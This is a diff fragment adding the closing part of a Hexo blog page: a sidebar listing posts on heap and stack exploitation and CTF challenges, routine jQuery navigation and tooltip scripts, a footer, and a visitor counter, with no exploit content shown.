+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/03/01/Tcache/">Hgame2019_babytcache</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/01/pwnable_tw/">pwnable.tw</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/22/hacknote/">pwnable.tw_hacknote</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/29/dynelf/">DynELF</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/28/ichunqiu_easypwn/">Ichunqiu_Easypwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/26/ret2libc/">Ret2libc</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/24/ret2shellcode/">Ret2ShellCode</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/20/overflow_freed_chunk/">Overflow Freed Chunk</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/19/Fastbin_Double_Free/">Fastbin Double Free</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/11/use_after_free/">Use After Free</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/11/hello-world/">Hello World</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2019 钞sir
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style="display:none">
+                        <span id="site-visit">海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style="display:none">
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
